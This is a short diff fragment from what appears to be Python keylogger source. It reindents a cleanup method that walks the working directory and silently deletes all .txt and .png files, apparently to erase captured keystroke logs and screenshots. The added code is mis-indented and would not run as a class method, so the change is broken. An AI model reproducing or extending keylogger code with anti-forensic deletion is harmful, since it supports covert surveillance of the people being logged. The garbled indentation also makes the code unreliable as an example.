@@ -138,16 +138,18 @@ class Keylogger:
         except KeyboardInterrupt:
             self.my_cleanup_function()
 
-    def my_cleanup_function(self):
-        directory= os.getcwd()
-        for root, dirs, files in os.walk(directory):
-            for file in files:
-                path = os.path.join(root, file)
-                if (path.endswith(".txt") or path.endswith(".png")):
-                    try:
-                        os.remove(path)
-                    except:
-                        pass
+   
+
+     def my_cleanup_function(self):
+            directory= os.getcwd()
+            for root, dirs, files in os.walk(directory):
+                for file in files:
+                    path = os.path.join(root, file)
+                    if (path.endswith(".txt") or path.endswith(".png")):
+                        try:
+                            os.remove(path)
+                        except:
+                            pass
                         
 
 
